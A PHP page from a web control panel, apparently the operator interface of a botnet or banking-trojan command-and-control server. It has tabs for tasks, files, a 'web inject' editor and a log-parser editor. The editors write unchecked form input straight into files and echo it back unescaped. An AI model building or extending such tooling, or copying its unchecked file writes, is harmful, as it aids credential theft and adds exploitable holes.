<?php

require_once('inc/require.php');
require_once('inc/load.php');



if(isset($_POST['get_form']) || isset($_POST['ajax'])) { require_once('class/class.files.php'); return false;}

if(!isset($_POST['ajax'])) 
{	
	require_once('inc/head_new.inc');
	require_once('inc/menu.html');
}


?>

<section id="content">
            <div class="wrapper">
                <div class="crumb">
                    <ul class="breadcrumb">
                      <li><a href="#"><i class="icon16 i-home-4"></i>Home</a> <span class="divider">/</span></li>
                       <li class="active">Controls</li>
                   
                    </ul>
                </div>
                
   <ul id="myTab" class="nav nav-tabs">
                                <li <?php if(!isset($_GET['files']) && !isset($_GET['inj_edit']) && !isset($_GET['log_parser'])) print "class='active'"; ?>><a href="?">Tasks</a></li>
                                <li <?php if(isset($_GET['files'])) print "class='active'"; ?>><a href="?files=true">Files</a></li>
                                <li <?php if(isset($_GET['inj_edit'])) print "class='active'"; ?>><a href="?inj_edit=true">inject</a></li> 
								
                            </ul>

                            <div class="tab-content">
							    <?php 
							   if (isset($_GET['log_parser']))
							   {  
							   if(isset($_POST['edit']))
							{
							 file_put_contents($_vars['ParserFile'], '<?php die(); ?>'.$_POST['parser']);

							}

							   $content = file_get_contents($_vars['ParserFile']);
							   $content = str_replace('<?php die(); ?>', "", $content);
							   
							   ?>    <div class="tab-pane fade in active " >
                               <form action="?log_parser=true" method="post">
                               <textarea name="parser" style="width:800px; height:200px"><?php echo $content;?></textarea><br>
                                 <button type="submit" name="edit" class="btn btn-primary">Save changes</button>
                                 </form>
                               </div>
                               <?php
							   }
							   else
							   
							   if (isset($_GET['inj_edit']))
							   {  
							   if(isset($_POST['edit']))
							{
								file_put_contents($_vars['InjectsFile'], '<?php die(); ?>'.$_POST['inj_content']);
							}

							   $content = file_get_contents($_vars['InjectsFile']);
							   $content = str_replace('<?php die(); ?>', "", $content);
							   
							   ?>    <div class="tab-pane fade in active " >
                               <form action="?inj_edit=true" method="post">
                               <textarea name="inj_content" style="width:600px; height:200px"><?php echo $content;?></textarea><br>
                                 <button type="submit" name="edit" class="btn btn-primary">Save changes</button>
                                 </form>
                               </div>
                               <?php
							   }
							   else
							   
							   
							   if(isset($_GET['files']))
							   {
							   
							   require_once('class/class.files.php');
							   
							   }
							   
							   
							   else
							   {
							   require_once('class/class.tasks.php');
							   
							   }
							   
							   ?>
                    
                             
                             
                         
                               
                            </div>    
                            </section>